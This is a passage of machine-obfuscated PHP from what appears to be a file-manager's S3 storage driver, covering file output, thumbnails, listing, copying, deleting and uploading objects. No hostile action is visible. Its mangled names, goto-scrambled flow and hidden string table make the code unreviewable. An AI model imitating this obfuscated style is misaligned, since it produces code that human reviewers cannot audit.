fileOutServer($aâµ¾Ô¯Üá, $D‹‰†¥½àœ = false, $DÁìÅğËª˜ = false, $eÌàí×Ëõˆ = '') { $this->fileOut($aâµ¾Ô¯Üá, $D‹‰†¥½àœ, $DÁìÅğËª˜, $eÌàí×Ëõˆ); } public function fileOutLink($b‡çÙÍò¤è) { header($_SERVER[‡’¶øåüç˜][156] . $b‡çÙÍò¤è); die; } public function cacheMethod($AÍ…‹¿ÆØˆ, $bÛ˜ÄøÅ) { goto Dô©«‘…‰; Dô©«‘…‰: $DÃæšÓùª =& $_SERVER[‡’¶øåüç˜]; static $Dˆš’Ş¡ñ = array(); $A×éóºµƒ„ = $bÛ˜ÄøÅ ? ltrim($this->getPathOuter($bÛ˜ÄøÅ), $DÃæšÓùª[8]) : $bÛ˜ÄøÅ; goto dÒòõïµ¾â; CŸ‘ÂÍŞ¬Ô: $D³Õâ¶ìÊ‡ = isset($Dˆš’Ş¡ñ[$b«Ö²ãò]) ? $Dˆš’Ş¡ñ[$b«Ö²ãò] : null; if (!is_null($D³Õâ¶ìÊ‡)) { return $D³Õâ¶ìÊ‡; } $D³Õâ¶ìÊ‡ = $this->{$AÍ…‹¿ÆØˆ}($bÛ˜ÄøÅ); goto b´‡›¸‚ï; b´‡›¸‚ï: $Dˆš’Ş¡ñ[$b«Ö²ãò] = $D³Õâ¶ìÊ‡; return $D³Õâ¶ìÊ‡; goto DÉÙù£„å‰; dÒòõïµ¾â: $b«Ö²ãò = $DÃæšÓùª[157] . $AÍ…‹¿ÆØˆ . $DÃæšÓùª[158] . rtrim($A×éóºµƒ„, $DÃæšÓùª[8]); if (is_null($AÍ…‹¿ÆØˆ)) { $Dˆš’Ş¡ñ = array(); return; } if (is_null($bÛ˜ÄøÅ)) { unset($Dˆš’Ş¡ñ[$b«Ö²ãò]); return; } goto CŸ‘ÂÍŞ¬Ô; DÉÙù£„å‰: } public function fileOutImage($e±¦‰¨İ°µ, $A«éîÃ¯í = 250) { goto b¡ĞÈ½ùà¤; aî³¤Úƒç : if (!file_exists($Bª‹à²ßÍŠ) || filesize($Bª‹à²ßÍŠ) < 100) { return @file_exists($D»…ÇÍò˜©) ? IO::fileOut($D»…ÇÍò˜©) : $this->fileOut($e±¦‰¨İ°µ); } if (!($Bâ‡´‘ÅÕ = IO::move($Bª‹à²ßÍŠ, $AŠ‘¨¡á¸))) { return IO::fileOut($Bª‹à²ßÍŠ); } del_file($Bª‹à²ßÍŠ); goto FÀŠˆ’¿âÛ; AÈ²ªó¹†Ì: if ($EÁàäŠºŠá[$cÉ‰¢ÂçÜç[77]] <= 1024 * 50 || $e×í•ª£ØË || !function_exists($cÉ‰¢ÂçÜç[164]) || $EÁàäŠºŠá[$cÉ‰¢ÂçÜç[165]] == $cÉ‰¢ÂçÜç[166]) { return $this->fileOut($e±¦‰¨İ°µ, !1, $Fš†ìÆš…ø); } if (isset($EÁàäŠºŠá[$cÉ‰¢ÂçÜç[161]][$cÉ‰¢ÂçÜç[167]])) { $aâñÉíÍ¨ = $EÁàäŠºŠá[$cÉ‰¢ÂçÜç[161]][$cÉ‰¢ÂçÜç[167]]; } else { if (isset($EÁàäŠºŠá[$cÉ‰¢ÂçÜç[161]][$cÉ‰¢ÂçÜç[168]])) { $aâñÉíÍ¨ = $EÁàäŠºŠá[$cÉ‰¢ÂçÜç[161]][$cÉ‰¢ÂçÜç[168]]; } else { $aâñÉíÍ¨ = md5("{$EÁàäŠºŠá[$cÉ‰¢ÂçÜç[28]]}\x5f{$EÁàäŠºŠá[$cÉ‰¢ÂçÜç[75]]}\x5f{$EÁàäŠºŠá[$cÉ‰¢ÂçÜç[77]]}"); } } $EšÎ¸ªÍÜä = "{$aâñÉíÍ¨}\137{$A«éîÃ¯í}\x2e\x70\x6e\x67"; goto bˆôÆá¾î«; b¡ĞÈ½ùà¤: $cÉ‰¢ÂçÜç =& $_SERVER[‡’¶øåüç˜]; if (substr($e±¦‰¨İ°µ, 0, 4) == $cÉ‰¢ÂçÜç[144]) { $this->fileOutLink($e±¦‰¨İ°µ); } $EÁàäŠºŠá = $this->info($e±¦‰¨İ°µ); goto c‡ïç¼ Š; c‡ïç¼ Š: $Fš†ìÆš…ø = $EÁàäŠºŠá[$cÉ‰¢ÂçÜç[28]]; $e×í•ª£ØË = !1; if (isset($GLOBALS[$cÉ‰¢ÂçÜç[159]]) && $GLOBALS[$cÉ‰¢ÂçÜç[159]][$cÉ‰¢ÂçÜç[75]] == $EÁàäŠºŠá[$cÉ‰¢ÂçÜç[75]]) { $Fá¸ŞÚš†Ä = $GLOBALS[$cÉ‰¢ÂçÜç[159]][$cÉ‰¢ÂçÜç[160]]; if (!$EÁàäŠºŠá[$cÉ‰¢ÂçÜç[161]]) { $EÁàäŠºŠá[$cÉ‰¢ÂçÜç[161]] = $GLOBALS[$cÉ‰¢ÂçÜç[159]]; } if (isset($Fá¸ŞÚš†Ä[$cÉ‰¢ÂçÜç[162]])) { if ($Fá¸ŞÚš†Ä[$cÉ‰¢ÂçÜç[162]] <= $A«éîÃ¯í && $Fá¸ŞÚš†Ä[$cÉ‰¢ÂçÜç[163]] <= $A«éîÃ¯í) { $e×í•ª£ØË = !0; } } $Fš†ìÆš…ø = $EÁàäŠºŠá[$cÉ‰¢ÂçÜç[161]][$cÉ‰¢ÂçÜç[28]]; } goto AÈ²ªó¹†Ì; bˆôÆá¾î«: if (!($fùÀöÉ–³ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $cÉ‰¢ÂçÜç[169]))) { $AŠ‘¨¡á¸ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $cÉ‰¢ÂçÜç[170]); } else { $AŠ‘¨¡á¸ = KodIO::make($fùÀöÉ–³); } if ($fùÀöÉ–³ = IO::fileNameExist($AŠ‘¨¡á¸, $EšÎ¸ªÍÜä)) { $Bª‹à²ßÍŠ = KodIO::make($fùÀöÉ–³); return IO::fileOut($Bª‹à²ßÍŠ, !1, $Fš†ìÆš…ø); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto Cİ©‘ÇÙò; Cİ©‘ÇÙò: $Bª‹à²ßÍŠ = DATA_THUMB . $EšÎ¸ªÍÜä; del_file($Bª‹à²ßÍŠ); if (!@file_exists($Bª‹à²ßÍŠ)) { $a—Ø…ß±ËÙ = TEMP_FILES; if (!is_dir($a—Ø…ß±ËÙ)) { mk_dir($a—Ø…ß±ËÙ); } $D»…ÇÍò˜© = $a—Ø…ß±ËÙ . $aâñÉíÍ¨ . $cÉ‰¢ÂçÜç[91] . $EÁàäŠºŠá[$cÉ‰¢ÂçÜç[165]]; if (!@file_exists($D»…ÇÍò˜©)) { $D»…ÇÍò˜© = $this->download($e±¦‰¨İ°µ, $D»…ÇÍò˜©); } $C¦·Æœ¶ªÎ = new ImageThumb($D»…ÇÍò˜©, $cÉ‰¢ÂçÜç[171]); $C¦·Æœ¶ªÎ->prorate($Bª‹à²ßÍŠ, $A«éîÃ¯í, $A«éîÃ¯í * 10); } goto aî³¤Úƒç ; FÀŠˆ’¿âÛ: IO::fileOut($Bâ‡´‘ÅÕ); goto aÏÆº¯¿—¾; aÏÆº¯¿—¾: } public function fileOutImageServer($F‰‡ÜçĞ•Ç, $f…ä¯Ø†£ = 250) { $this->fileOutImage($F‰‡ÜçĞ•Ç, $f…ä¯Ø†£); } public function fileNameAuto($e½Õ“õìá, $Aò¿£ŸÂÖ, $cøÑİÃÈÙ = REPEAT_RENAME, $E´¹×—‹ = false) { goto e„–¡ëÆ¸; C·šÍğÜšŠ: $FêÃé³Ó§Ó = 1; $a—Ñ¯÷ƒå = substr($Aò¿£ŸÂÖ, 0, strlen($Aò¿£ŸÂÖ) - strlen($E–ñç·°µ)); $déò ÇÜ‚ = $a—Ñ¯÷ƒå . "\x28{$FêÃé³Ó§Ó}\x29{$E–ñç·°µ}"; goto dêùíîÇ¤å; EŠƒ¼Í‡: if ($cøÑİÃÈÙ == REPEAT_SKIP) { return !1; } $E–ñç·°µ = $eƒƒØ†÷¸[91] . get_path_ext($Aò¿£ŸÂÖ); $E–ñç·°µ = $E–ñç·°µ == $eƒƒØ†÷¸[91] || $E´¹×—‹ ? $eƒƒØ†÷¸[33] : $E–ñç·°µ; goto C·šÍğÜšŠ; e„–¡ëÆ¸: $eƒƒØ†÷¸ =& $_SERVER[‡’¶øåüç˜]; $e²Ì¶± ƒÌ = $e½Õ“õìá === $eƒƒØ†÷¸[33] ? $Aò¿£ŸÂÖ : rtrim($e½Õ“õìá, $eƒƒØ†÷¸[8]) . $eƒƒØ†÷¸[8] . $Aò¿£ŸÂÖ; if ($cøÑİÃÈÙ == REPEAT_REPLACE || !$this->exist($e²Ì¶± ƒÌ) || $E´¹×—‹ && $cøÑİÃÈÙ != REPEAT_RENAME_FOLDER) { return $Aò¿£ŸÂÖ; } goto EŠƒ¼Í‡; dêùíîÇ¤å: while ($this->exist(rtrim($e½Õ“õìá, $eƒƒØ†÷¸[8]) . $eƒƒØ†÷¸[8] . $déò ÇÜ‚)) { $déò ÇÜ‚ = $a—Ñ¯÷ƒå . "\50{$FêÃé³Ó§Ó}\x29{$E–ñç·°µ}"; $FêÃé³Ó§Ó++; } return $déò ÇÜ‚; goto eŒ¹«ÈÏˆæ; eŒ¹«ÈÏˆæ: } public function listAllFiles($Eã£‡ÔÄã, $A‡Æì’–ì½, $Còù²Ù·Ô× = array()) { goto AÔ»Ã„Í¼; eÅ„‹²Àš: foreach (array_unique($Câä˜‰½„Ê) as $cµ‚äßçÈ) { $Eæëµ½ßÀ = array($cÌ‚èÉšù[75] => $this->getPathOuter($cÌ‚èÉšù[8] . $Eã£‡ÔÄã . $cÌ‚èÉšù[8] . $cµ‚äßçÈ), $cÌ‚èÉšù[76] => 1, $cÌ‚èÉšù[77] => 0); if (substr($cµ‚äßçÈ, -1) != $cÌ‚èÉšù[8]) { $Eæëµ½ßÀ[$cÌ‚èÉšù[76]] = 0; $f®“¾´–‚„ = $this->getPath($Eã£‡ÔÄã . $cÌ‚èÉšù[8] . $cµ‚äßçÈ); $Eæëµ½ßÀ[$cÌ‚èÉšù[77]] = isset($Còù²Ù·Ô×[$f®“¾´–‚„]) ? $Còù²Ù·Ô×[$f®“¾´–‚„] : $this->size($f®“¾´–‚„); } $cÉìÕÁ±[] = $Eæëµ½ßÀ; } return $cÉìÕÁ±; goto f‰Ë—ë”; F·åéè”¥­: $Eã£‡ÔÄã = trim($Eã£‡ÔÄã, $cÌ‚èÉšù[8]); foreach ($A‡Æì’–ì½ as $cµ‚äßçÈ) { $b°ö«¥°£ = ltrim(substr($cµ‚äßçÈ, strlen($Eã£‡ÔÄã)), $cÌ‚èÉšù[8]); $Câä˜‰½„Ê = array_merge($Câä˜‰½„Ê, $this->slicePath($b°ö«¥°£)); } $cÉìÕÁ± = array(); goto eÅ„‹²Àš; AÔ»Ã„Í¼: $cÌ‚èÉšù =& $_SERVER[‡’¶øåüç˜]; if (empty($A‡Æì’–ì½)) { return array(); } $Câä˜‰½„Ê = array(); goto F·åéè”¥­; f‰Ë—ë”: } public function slicePath($bĞŠ¸£ã‹Ü) { $BçŸ™È‹¨’ =& $_SERVER[‡’¶øåüç˜]; $BùÕÚÜƒÌ§ = explode($BçŸ™È‹¨’[8], trim($bĞŠ¸£ã‹Ü, $BçŸ™È‹¨’[8])); $e©“Ôø©µ = 0; do { ++$e©“Ôø©µ; $EØ³åÏà¢‡[] = implode($BçŸ™È‹¨’[8], array_slice($BùÕÚÜƒÌ§, 0, $e©“Ôø©µ)) . $BçŸ™È‹¨’[8]; } while ($e©“Ôø©µ < count($BùÕÚÜƒÌ§)); $EØ³åÏà¢‡[count($BùÕÚÜƒÌ§) - 1] = $bĞŠ¸£ã‹Ü; return $EØ³åÏà¢‡; } public function getHost() { $F¾—¡¨ÔöÙ =& $_SERVER[‡’¶øåüç˜]; $B÷´ˆÒå = parse_url(trim($this->domain, $F¾—¡¨ÔöÙ[8])); $F••ËˆÚ¤Ç = isset($B÷´ˆÒå[$F¾—¡¨ÔöÙ[172]]) ? $B÷´ˆÒå[$F¾—¡¨ÔöÙ[172]] : http_type(); $EÙæ•İ·öË = isset($B÷´ˆÒå[$F¾—¡¨ÔöÙ[173]]) ? $B÷´ˆÒå[$F¾—¡¨ÔöÙ[173]] : $B÷´ˆÒå[$F¾—¡¨ÔöÙ[75]]; if (isset($B÷´ˆÒå[$F¾—¡¨ÔöÙ[174]])) { $EÙæ•İ·öË .= $F¾—¡¨ÔöÙ[4] . $B÷´ˆÒå[$F¾—¡¨ÔöÙ[174]]; } return $F••ËˆÚ¤Ç . $F¾—¡¨ÔöÙ[175] . $EÙæ•İ·öË; } public function pathEncode($BÆÇ°Ã‹¸×) { $B‚‘¦ëÂåÂ =& $_SERVER[‡’¶øåüç˜]; return str_replace($B‚‘¦ëÂåÂ[176], $B‚‘¦ëÂåÂ[8], rawurlencode($BÆÇ°Ã‹¸×)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($A‡‰ï²…ë±) { set_timeout(); require_once SDK_DIR . $_SERVER[‡’¶øåüç˜][177]; parent::__construct(); $this->_init($A‡‰ï²…ë±); } public function _init($A…–ŒŒ‡Ëõ) { foreach ($A…–ŒŒ‡Ëõ as $BÌùÚšÛñµ => $CëçÛÖÓÌš) { if (isset($this->{$BÌùÚšÛñµ})) { $this->{$BÌùÚšÛñµ} = $CëçÛÖÓÌš; } } $this->endpoint = $A…–ŒŒ‡Ëõ[$_SERVER[‡’¶øåüç˜][178]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($B©¤’— ¡â = "\166\64") { $this->signVer = $B©¤’— ¡â; $this->client->setSignatureVersion($B©¤’— ¡â); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto A£é Û¶¸¯; EÑÉ±Ñø†: if ($Fß¹‡’ùï–[$f¿ÏÅ“¹è[179]] != $f¿ÏÅ“¹è[180] || $Fß¹‡’ùï–[$f¿ÏÅ“¹è[181]] != $f¿ÏÅ“¹è[180]) { return !1; } $FË¤®ƒá ç = array_map($f¿ÏÅ“¹è[182], $Fß¹‡’ùï–[$f¿ÏÅ“¹è[183]]); if (!is_array($FË¤®ƒá ç)) { $FË¤®ƒá ç = array(); } goto c¨Ã´øò‘õ; A£é Û¶¸¯: $f¿ÏÅ“¹è =& $_SERVER[‡’¶øåüç˜]; $Fß¹‡’ùï– = $this->getBucketCors(); if (!$Fß¹‡’ùï– || !is_array($Fß¹‡’ùï–)) { return !1; } goto EÑÉ±Ñø†; c¨Ã´øò‘õ: $cÂ„â©ÈÙà = array($f¿ÏÅ“¹è[184], $f¿ÏÅ“¹è[185], $f¿ÏÅ“¹è[186], $f¿ÏÅ“¹è[187], $f¿ÏÅ“¹è[188]); $eô£„ÕÂŒó = array_diff($cÂ„â©ÈÙà, $FË¤®ƒá ç); return empty($eô£„ÕÂŒó); goto f˜Öâ­îäĞ; f˜Öâ­îäĞ: } public function mkfile($fÈ®«ÀÙï‰, $C­»ã÷Ö¾Ã = '', $E›¦¡èç“ = REPEAT_RENAME) { $cœ•ĞšÙ¸ = $this->setContent($fÈ®«ÀÙï‰, $C­»ã÷Ö¾Ã); if ($cœ•ĞšÙ¸ !== !1) { return $this->getPathOuter($fÈ®«ÀÙï‰); } return !1; } public function mkdir($d”Ï†Í­äå, $F£îĞÓµ×ò = REPEAT_SKIP) { if (empty($d”Ï†Í­äå)) { return !1; } if ($this->_isFolder($d”Ï†Í­äå)) { return $this->getPathOuter($d”Ï†Í­äå); } $a°¾ˆÅØì = $this->setContent($d”Ï†Í­äå, $_SERVER[‡’¶øåüç˜][33], !0); if ($a°¾ˆÅØì !== !1) { return $this->getPathOuter($d”Ï†Í­äå); } return !1; } public function copyFile($e•³ŞÈĞ†, $d·¥÷‚©›‰, $AÈÇĞÜİ•º = array()) { $A»¥¶Ûöœ =& $_SERVER[‡’¶øåüç˜]; $FÇ’ÑÚÚƒ’ = $this->objectMeta($e•³ŞÈĞ†); if (!$FÇ’ÑÚÚƒ’) { return !1; } if ($FÇ’ÑÚÚƒ’[$A»¥¶Ûöœ[77]] <= 1024 * 1024 * 200) { $BßôœÇŸèÒ = $this->client->copyObject($this->bucket, $e•³ŞÈĞ†, $this->bucket, $d·¥÷‚©›‰, $A»¥¶Ûöœ[189], $AÈÇĞÜİ•º); } else { $BßôœÇŸèÒ = $this->client->multiCopyObject($this->bucket, $e•³ŞÈĞ†, $this->bucket, $d·¥÷‚©›‰, $AÈÇĞÜİ•º); } $BßôœÇŸèÒ = $BßôœÇŸèÒ ? $this->getPathOuter($d·¥÷‚©›‰) : !1; return $BßôœÇŸèÒ; } public function moveFile($EŒà«¹ƒÖ›, $eò²¨ŞŒ) { if ($this->copyFile($EŒà«¹ƒÖ›, $eò²¨ŞŒ)) { $this->delFile($EŒà«¹ƒÖ›); return $this->getPathOuter($eò²¨ŞŒ); } return !1; } public function delFile($CŠÉÄí¼ˆ) { return $this->client->deleteObject($this->bucket, $CŠÉÄí¼ˆ); } public function delFolder($C™©Ÿ®¸ˆ) { goto D‚¶ãßËò; BäÎ¯ä©”÷: return $fØ£†œ‡İ === $Féš†³ÒÈŒ ? !0 : !1; goto e¦ãŠ¨ºä†; A¿ÑáËê×°: $fØ£†œ‡İ = $Féš†³ÒÈŒ = 0; $fÀ‚£é”éí = array_chunk(array_keys($dáÊæÈëÓ‘), 1000); foreach ($fÀ‚£é”éí as $e§º¡™µØ) { $fØ£†œ‡İ++; $Féš†³ÒÈŒ += (int) $this->client->deleteObjects($this->bucket, $e§º¡™µØ); } goto BäÎ¯ä©”÷; D‚¶ãßËò: $A…ãŒ¤ÊÃâ =& $_SERVER[‡’¶øåüç˜]; $dáÊæÈëÓ‘ = $this->listObjs($C™©Ÿ®¸ˆ); if (!$dáÊæÈëÓ‘) { $C™©Ÿ®¸ˆ = trim($C™©Ÿ®¸ˆ, $A…ãŒ¤ÊÃâ[8]); if (!empty($C™©Ÿ®¸ˆ)) { $C™©Ÿ®¸ˆ .= $A…ãŒ¤ÊÃâ[8]; } return $this->delFile($C™©Ÿ®¸ˆ); } goto A¿ÑáËê×°; e¦ãŠ¨ºä†: } public function rename($bæÍ´¾•ŞË, $C‰îä½¢Ÿï) { return $this->renameObject($bæÍ´¾•ŞË, $C‰îä½¢Ÿï); } public function listPath($DµË›ÇÊ‘è, $D—›´ˆ˜Ş± = false) { $d´¯÷¯†¿á =& $_SERVER[‡’¶øåüç˜]; $eê±ÈÀÀóˆ = $this->listObjs($DµË›ÇÊ‘è, null, null, $d´¯÷¯†¿á[8]); $EŠƒîõé’ = array($d´¯÷¯†¿á[74] => array(), $d´¯÷¯†¿á[73] => array()); foreach ($eê±ÈÀÀóˆ as $E³ªŠƒÔ‹¨ => $bˆ‡²½¢Á) { if ($E³ªŠƒÔ‹¨ == $d´¯÷¯†¿á[8]) { continue; } if (isset($bˆ‡²½¢Á[$d´¯÷¯†¿á[190]])) { $EŠƒîõé’[$d´¯÷¯†¿á[74]][] = $this->folderInfo($bˆ‡²½¢Á[$d´¯÷¯†¿á[190]], $D—›´ˆ˜Ş±); } else { if (substr($bˆ‡²½¢Á[$d´¯÷¯†¿á[28]], -1) == $d´¯÷¯†¿á[8]) { continue; } $EŠƒîõé’[$d´¯÷¯†¿á[73]][] = $this->fileInfo($bˆ‡²½¢Á[$d´¯÷¯†¿á[28]], $D—›´ˆ˜Ş±, $bˆ‡²½¢Á); } } return $EŠƒîõé’; } private function fileInfo($AÈ‘½ÈŸå, $cŒÖÊ’Ô› = false, $E›ŠÀàÌÔ = array()) { goto e²Äˆ›´ùä; CØĞÓšãÊì: return $cªßä°İ£; goto A±ñíÕÈ÷; b´•‘ğ—Û: if (empty($E›ŠÀàÌÔ)) { $E›ŠÀàÌÔ = $this->objectMeta($AÈ‘½ÈŸå); if (!$E›ŠÀàÌÔ) { return $cªßä°İ£; } } if (isset($E›ŠÀàÌÔ[$C­¡¡œ÷¬[194]])) { $cªßä°İ£[$C­¡¡œ÷¬[107]] = $E›ŠÀàÌÔ[$C­¡¡œ÷¬[194]]; } if (isset($E›ŠÀàÌÔ[$C­¡¡œ÷¬[77]])) { $cªßä°İ£[$C­¡¡œ÷¬[77]] = $E›ŠÀàÌÔ[$C­¡¡œ÷¬[77]]; } goto CØĞÓšãÊì; e²Äˆ›´ùä: $C­¡¡œ÷¬ =& $_SERVER[‡’¶øåüç˜]; if ($cŒÖÊ’Ô›) { return array($C­¡¡œ÷¬[28] => $this->pathThis($AÈ‘½ÈŸå), $C­¡¡œ÷¬[75] => $this->getPathOuter($AÈ‘½ÈŸå), $C­¡¡œ÷¬[29] => $C­¡¡œ÷¬[171], $C­¡¡œ÷¬[165] => $this->ext($AÈ‘½ÈŸå), $C­¡¡œ÷¬[77] => isset($E›ŠÀàÌÔ[$C­¡¡œ÷¬[77]]) ? $E›ŠÀàÌÔ[$C­¡¡œ÷¬[77]] : 0, $C­¡¡œ÷¬[191] => 0, $C­¡¡œ÷¬[107] => 0, $C­¡¡œ÷¬[192] => !0, $C­¡¡œ÷¬[193] => !0); } $cªßä°İ£ = array($C­¡¡œ÷¬[28] => $this->pathThis($AÈ‘½ÈŸå), $C­¡¡œ÷¬[75] => $this->getPathOuter($AÈ‘½ÈŸå), $C­¡¡œ÷¬[29] => $C­¡¡œ÷¬[171], $C­¡¡œ÷¬[191] => 0, $C­¡¡œ÷¬[107] => 0, $C­¡¡œ÷¬[77] => 0, $C­¡¡œ÷¬[165] => $this->ext($AÈ‘½ÈŸå), $C­¡¡œ÷¬[192] => !0, $C­¡¡œ÷¬[193] => !0); goto b´•‘ğ—Û; A±ñíÕÈ÷: } private function folderInfo($CŞ“·…ä¦Ë, $CóƒìĞ¬¡ = false) { goto fé…”•ÎÂ; fé…”•ÎÂ: $aùÊ³ß‡•¾ =& $_SERVER[‡’¶øåüç˜]; if ($CóƒìĞ¬¡) { return array($aùÊ³ß‡•¾[28] => $this->pathThis($CŞ“·…ä¦Ë), $aùÊ³ß‡•¾[75] => $this->getPathOuter($aùÊ³ß‡•¾[8] . $CŞ“·…ä¦Ë), $aùÊ³ß‡•¾[29] => $aùÊ³ß‡•¾[76], $aùÊ³ß‡•¾[192] => !0, $aùÊ³ß‡•¾[193] => !0); } $EÀ¨Ö´„í· = array($aùÊ³ß‡•¾[28] => $this->pathThis($CŞ“·…ä¦Ë), $aùÊ³ß‡•¾[75] => $this->getPathOuter($aùÊ³ß‡•¾[8] . $CŞ“·…ä¦Ë), $aùÊ³ß‡•¾[29] => $aùÊ³ß‡•¾[76], $aùÊ³ß‡•¾[191] => 0, $aùÊ³ß‡•¾[107] => 0, $aùÊ³ß‡•¾[192] => !0, $aùÊ³ß‡•¾[193] => !0); goto eÅØ®¼ùÔœ; cğÌøéšš¡: if (isset($AÑÛ±ÛÁÃõ[$aùÊ³ß‡•¾[194]])) { $EÀ¨Ö´„í·[$aùÊ³ß‡•¾[191]] = $AÑÛ±ÛÁÃõ[$aùÊ³ß‡•¾[194]]; } return $EÀ¨Ö´„í·; goto F˜ÔôØ¶; eÅØ®¼ùÔœ: if ($CŞ“·…ä¦Ë == $aùÊ³ß‡•¾[33]) { return $EÀ¨Ö´„í·; } $CŞ“·…ä¦Ë = trim($CŞ“·…ä¦Ë, $aùÊ³ß‡•¾[8]) . $aùÊ³ß‡•¾[8]; $AÑÛ±ÛÁÃõ = $this->objectMeta($CŞ“·…ä¦Ë); goto cğÌøéšš¡; F˜ÔôØ¶: } public function listObjs($B“ßçä‰¸¢, $F¯ÁÅáÚÂÙ = null, $FƒÕÆ¦‘¥ö = null, $e²•ß„„¢ß = null) { $F­âÌò¯È¦ =& $_SERVER[‡’¶øåüç˜]; $B“ßçä‰¸¢ = trim($B“ßçä‰¸¢, $F­âÌò¯È¦[8]); $fòº¬º– = empty($B“ßçä‰¸¢) ? $F­âÌò¯È¦[33] : $B“ßçä‰¸¢ . $F­âÌò¯È¦[8]; return $this->client->getBucket($this->bucket, $fòº¬º–, $F¯ÁÅáÚÂÙ, $FƒÕÆ¦‘¥ö, $e²•ß„„¢ß, !0); } public function has($f¥®´Õ™Åî, $fÌ³‘Ó‹É— = false, $DĞé›ğŠø = true) { goto FçˆêÀåøê; FçˆêÀåøê: $b¸Ãˆ±ë†› =& $_SERVER[‡’¶øåüç˜]; $aÖÓğÑíåœ = 0; $b­×ˆèñÚÑ = 0; goto eñ™°™²ä¬; FªÙÃöò„Ş: if ($fÌ³‘Ó‹É—) { return array($b¸Ãˆ±ë†›[195] => $aÖÓğÑíåœ, $b¸Ãˆ±ë†›[196] => $b­×ˆèñÚÑ); } return !1; goto dÔ…¯‡¸Ö; eñ™°™²ä¬: $E¼‹÷‘˜Ï = $this->listObjs($f¥®´Õ™Åî, null, null, $b¸Ãˆ±ë†›[8]); $E¼‹÷‘˜Ï = is_array($E¼‹÷‘˜Ï) ? $E¼‹÷‘˜Ï : array(); foreach ($E¼‹÷‘˜Ï as $fˆÙó²Ÿ¹¦) { if (isset($fˆÙó²Ÿ¹¦[$b¸Ãˆ±ë†›[28]]) && substr($fˆÙó²Ÿ¹¦[$b¸Ãˆ±ë†›[28]], -1) != $b¸Ãˆ±ë†›[8]) { if (!$fÌ³‘Ó‹É— && $DĞé›ğŠø) { return !0; } $aÖÓğÑíåœ++; } else { if (isset($fˆÙó²Ÿ¹¦[$b¸Ãˆ±ë†›[190]])) { if (!$fÌ³‘Ó‹É— && !$DĞé›ğŠø) { return !1; } $b­×ˆèñÚÑ++; } } } goto FªÙÃöò„Ş; dÔ…¯‡¸Ö: } public function listAll($f„îÆ‰‡áÄ) { $Eã—ã¤Ş£ó =& $_SERVER[‡’¶øåüç˜]; $fÚÃì—†â¯ = $this->listObjs($f„îÆ‰‡áÄ); $b¹¹–Œà = $dÂÑŠ›œ·á = array(); foreach ($fÚÃì—†â¯ as $aáÅ“ìŒÏò => $AÊ×ì¿Òƒ) { $b¹¹–Œà[] = $AÊ×ì¿Òƒ[$Eã—ã¤Ş£ó[28]]; $dÂÑŠ›œ·á[$aáÅ“ìŒÏò] = $AÊ×ì¿Òƒ[$Eã—ã¤Ş£ó[77]]; } return $this->listAllFiles($f„îÆ‰‡áÄ, $b¹¹–Œà, $dÂÑŠ›œ·á); } public function canRead($Bê“‹Ï”¡¸) { $a³Üä÷×†¹ =& $_SERVER[‡’¶øåüç˜]; $a—š•°à¤Ã = $this->client->getAccessControlPolicy($this->bucket, $Bê“‹Ï”¡¸); if (!$a—š•°à¤Ã) { return !1; } return in_array($a—š•°à¤Ã, array($a³Üä÷×†¹[197], $a³Üä÷×†¹[198], $a³Üä÷×†¹[199])) ? !0 : !1; } public function canWrite($a‘â°»¥) { $b´¹Ê×¿ŒÛ =& $_SERVER[‡’¶øåüç˜]; $E±Åˆ´‚Û‡ = $this->client->getAccessControlPolicy($this->bucket, $a‘â°»¥); if (!$E±Åˆ´‚Û‡) { return !1; } return in_array($E±Åˆ´‚Û‡, array($b´¹Ê×¿ŒÛ[197], $b´¹Ê×¿ŒÛ[198])) ? !0 : !1; } public function getContent($aëÀÍ‰©²ƒ) { return $this->client->getObject($this->bucket, $aëÀÍ‰©²ƒ); } public function setContent($bÜÍìƒÔ©‹, $c‰–ˆâ’œ¸ = '', $Eöùª¥½¦¦ = false) { goto C¶®‘Ú† ğ; C¶®‘Ú† ğ: $bšŸË›ÕÇ =& $_SERVER[‡’¶øåüç˜]; $bÜÍìƒÔ©‹ = $Eöùª¥½¦¦ ? trim($bÜÍìƒÔ©‹, $bšŸË›ÕÇ[8]) . $bšŸË›ÕÇ[8] : $bÜÍìƒÔ©‹; $c”Ìôç§œ = get_file_mime(get_path_ext($bÜÍìƒÔ©‹)); goto b²ƒ‘•¥”¬; b²ƒ‘•¥”¬: $dÙ¼›»°” = $this->client->putObject($c‰–ˆâ’œ¸, $this->bucket, $bÜÍìƒÔ©‹, $bšŸË›ÕÇ[189], array(), $c”Ìôç§œ); if (!$dÙ¼›»°”) { return !1; } if ($Eöùª¥½¦¦) { return !0; } goto D¨¡¤ÜŒ‰Ú; D¨¡¤ÜŒ‰Ú: $this->cacheMethod(null, null); $dÙ¼›»°” = $this->copyFile($bÜÍìƒÔ©‹, $bÜÍìƒÔ©‹, array($bšŸË›ÕÇ[200] => $dÙ¼›»°”[$bšŸË›ÕÇ[201]])); return $dÙ¼›»°” ? !0 : !1; goto cœŒÓä™ƒ±; cœŒÓä™ƒ±: } public function fileSubstr($Dî¥¡­´ö», $d×ªÊĞ•ÓÏ, $D² äîèò‡) { $F­æ‡¼›éº = $d×ªÊĞ•ÓÏ + $D² äîèò‡ - 1; return $this->client->getObject($this->bucket, $Dî¥¡­´ö», array($_SERVER[‡’¶øåüç˜][202] => "\142\171\x74\145\163\75{$d×ªÊĞ•ÓÏ}\55{$F­æ‡¼›éº}")); } public function upload($FÔ±¤ˆå°è, $eïß¥©§¶, $AÈïêÃ¨ã­ = false, $CİÓÏ•¥Í„ = REPEAT_REPLACE) { $D²‡—áë›÷ =& $_SERVER[‡’¶øåüç˜]; $déõÑãåÑ = array($D²‡—áë›÷[200] => @md5_file($eïß¥©§¶)); $cÕğµå‰ç§ = array($D²‡—áë›÷[203] => get_file_mime(get_path_ext($FÔ±¤ˆå°è))); if (IO::size($eïß¥©§¶) <= 1024 * 1024 * 